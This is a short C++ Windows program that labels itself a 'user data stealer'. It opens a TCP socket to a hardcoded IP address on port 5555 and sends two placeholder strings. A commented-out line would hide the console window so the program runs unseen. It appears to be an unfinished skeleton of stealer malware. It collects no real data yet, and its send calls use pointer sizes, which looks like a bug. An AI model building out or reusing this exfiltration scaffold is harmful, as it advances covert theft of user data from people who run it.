#define _WINSOCK_DEPRECATED_NO_WARNINGS                       //user data stealer
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>

int main()
{
	std::cout << "Started ....." << std::endl;
//ShowWindow(GetConsoleWindow(), SW_HIDE);
WSADATA WSAData;
SOCKET server;
SOCKADDR_IN addr;
WSAStartup(MAKEWORD(2, 0), &WSAData);
server = socket(AF_INET, SOCK_STREAM, 0);
addr.sin_addr.s_addr = inet_addr("192.168.43.36");
addr.sin_family = AF_INET;
addr.sin_port = htons(5555);
connect(server, (SOCKADDR *)&addr, sizeof(addr));
char* Path = "Hello";
char* name = "Stranger"; 
send(server, Path, sizeof(Path), 0);

send(server, name, sizeof(name), 0);
 
closesocket(server);
WSACleanup();

std::cout<< "ended....";
}
